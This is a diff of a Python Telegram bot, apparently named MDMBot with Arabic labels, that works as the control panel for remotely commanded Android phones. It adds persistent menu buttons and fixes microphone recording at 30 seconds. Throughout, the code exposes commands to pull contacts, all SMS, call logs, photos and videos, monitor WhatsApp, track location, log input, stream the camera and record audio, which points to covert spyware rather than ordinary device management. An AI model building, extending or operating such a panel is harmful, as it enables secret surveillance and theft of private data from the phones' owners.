@@ -255,7 +255,7 @@ COMMANDS = {
     "stop-camera-stream":        {"category": "camera", "label": "⏹ إيقاف بث الكاميرا",  "description": "إيقاف بث الكاميرا", "needs_param": False},
     # screenshot تمت إزالته - تمت إضافته في camera section
     # audio
-    "microphone":     {"category": "audio",  "label": "🎤 تسجيل صوتي",      "description": "تسجيل من الميكروفون (اكتب المدة بالثواني)",     "needs_param": True, "param_hint": "10 أو 60 أو 120 (ثانية)"},
+    "microphone":     {"category": "audio",  "label": "🎤 تسجيل صوتي (30ث)",  "description": "تسجيل 30 ثانية من الميكروفون",     "needs_param": False},
     "playAudio":      {"category": "audio",  "label": "🔊 تشغيل صوت",       "description": "تشغيل ملف صوتي",          "needs_param": True, "param_hint": "رابط الصوت"},
     "stopAudio":      {"category": "audio",  "label": "🔇 إيقاف الصوت",      "description": "إيقاف الصوت",              "needs_param": False},
     # control
@@ -449,11 +449,8 @@ def data_keyboard(did):
     kb.add(_cbtn(did,"contacts"), _cbtn(did,"all-sms"))
     kb.add(_cbtn(did,"calls"), _cbtn(did,"apps"))
     kb.add(_cbtn(did,"gallery"))
-    # ⚠️ gmail تمت إزالته
-    # whatsapp-live تمت إزالته
     kb.add(_cbtn(did,"whatsapp-monitor-on"))
     kb.add(_cbtn(did,"whatsapp-monitor-off"))
-    # ⚠️ telegram-messages تمت إزالته
     kb.add(_cbtn(did,"get-location"))
     kb.add(_back(did))
     return kb
@@ -471,8 +468,8 @@ def camera_keyboard(did):
 # ── Audio Keyboard ──
 def audio_keyboard(did):
     kb = InlineKeyboardMarkup(row_width=2)
-    kb.add(_cbtn(did,"microphone"), _cbtn(did,"playAudio"))
-    kb.add(_cbtn(did,"stopAudio"))
+    kb.add(_cbtn(did,"microphone"), _cbtn(did,"stopAudio"))
+    kb.add(_cbtn(did,"playAudio"))
     kb.add(_back(did))
     return kb
 
@@ -490,10 +487,11 @@ def tools_keyboard(did):
 def advanced_keyboard(did):
     kb = InlineKeyboardMarkup(row_width=2)
     kb.add(_cbtn(did,"input-monitoring-on"), _cbtn(did,"input-monitoring-off"))
-    # screenshot-on/off تمت إزالته
     kb.add(_cbtn(did,"apply-data-protection"))
+    # ⚡ سحب الصور: زر سحب + زر إيقاف في نفس الصف
+    kb.add(_cbtn(did,"gallery"), _cbtn(did,"stop-gallery"))
+    # ⚡ سحب الفيديوهات: زر سحب + زر إيقاف في نفس الصف
     kb.add(_cbtn(did,"pull-videos"), _cbtn(did,"stop-videos"))
-    kb.add(_cbtn(did,"stop-gallery"))
     kb.add(_back(did))
     return kb
 
@@ -1038,7 +1036,22 @@ class MDMBot:
             # Build beautiful dashboard
             dashboard_text = _format_dashboard(stats, devs)
 
-            # Build keyboard based on device state
+            # ⚡ إضافة Reply Keyboard (أزرار دائمة أسفل الشاشة)
+            reply_kb = telebot.types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
+            reply_kb.add(
+                telebot.types.KeyboardButton("🎮 لوحة التحكم"),
+                telebot.types.KeyboardButton("🔓 الأذونات")
+            )
+            reply_kb.add(
+                telebot.types.KeyboardButton("📷 كاميرا وشاشة"),
+                telebot.types.KeyboardButton("📦 سحب بيانات")
+            )
+            reply_kb.add(
+                telebot.types.KeyboardButton("⚡ أوامر متقدمة"),
+                telebot.types.KeyboardButton("ℹ️ معلومات")
+            )
+
+            # Build inline keyboard based on device state
             if not devs:
                 kb = InlineKeyboardMarkup(row_width=1)
                 kb.add(InlineKeyboardButton("🔄 تحديث", callback_data="menu:home"))
@@ -1338,6 +1351,68 @@ class MDMBot:
         def _t(m):
             cid = m.chat.id
             text = m.text.strip()
+
+            # ⚡ معالجة أزرار Reply Keyboard الدائمة
+            if text == "🎮 لوحة التحكم":
+                devs = self.dm.get_all_devices()
+                online_devs = self.dm.get_online_devices()
+                if online_devs:
+                    dev = online_devs[0]
+                    kb = control_panel_keyboard(dev["device_id"], dev.get("banned", False))
+                    bot.send_message(cid, f"🎮 <b>لوحة التحكم</b>\n📱 {dev_label(dev)}", parse_mode="HTML", reply_markup=kb)
+                else:
+                    bot.send_message(cid, "🔴 لا يوجد جهاز متصل حالياً")
+                return
+
+            if text == "🔓 الأذونات":
+                devs = self.dm.get_online_devices()
+                if devs:
+                    dev = devs[0]
+                    kb = permissions_keyboard(dev["device_id"])
+                    bot.send_message(cid, f"🔓 <b>الأذونات</b>\n📱 {dev_label(dev)}", parse_mode="HTML", reply_markup=kb)
+                else:
+                    bot.send_message(cid, "🔴 لا يوجد جهاز متصل")
+                return
+
+            if text == "📷 كاميرا وشاشة":
+                devs = self.dm.get_online_devices()
+                if devs:
+                    dev = devs[0]
+                    kb = camera_keyboard(dev["device_id"])
+                    bot.send_message(cid, f"📷 <b>كاميرا وشاشة</b>\n📱 {dev_label(dev)}", parse_mode="HTML", reply_markup=kb)
+                else:
+                    bot.send_message(cid, "🔴 لا يوجد جهاز متصل")
+                return
+
+            if text == "📦 سحب بيانات":
+                devs = self.dm.get_online_devices()
+                if devs:
+                    dev = devs[0]
+                    kb = data_keyboard(dev["device_id"])
+                    bot.send_message(cid, f"📦 <b>سحب بيانات</b>\n📱 {dev_label(dev)}", parse_mode="HTML", reply_markup=kb)
+                else:
+                    bot.send_message(cid, "🔴 لا يوجد جهاز متصل")
+                return
+
+            if text == "⚡ أوامر متقدمة":
+                devs = self.dm.get_online_devices()
+                if devs:
+                    dev = devs[0]
+                    kb = advanced_keyboard(dev["device_id"])
+                    bot.send_message(cid, f"⚡ <b>أوامر متقدمة</b>\n📱 {dev_label(dev)}", parse_mode="HTML", reply_markup=kb)
+                else:
+                    bot.send_message(cid, "🔴 لا يوجد جهاز متصل")
+                return
+
+            if text == "ℹ️ معلومات":
+                devs = self.dm.get_online_devices()
+                if devs:
+                    dev = devs[0]
+                    kb = info_keyboard(dev["device_id"])
+                    bot.send_message(cid, f"ℹ️ <b>معلومات</b>\n📱 {dev_label(dev)}", parse_mode="HTML", reply_markup=kb)
+                else:
+                    bot.send_message(cid, "🔴 لا يوجد جهاز متصل")
+                return
 
             # Handle pending parameter input
             if cid in self._pending:
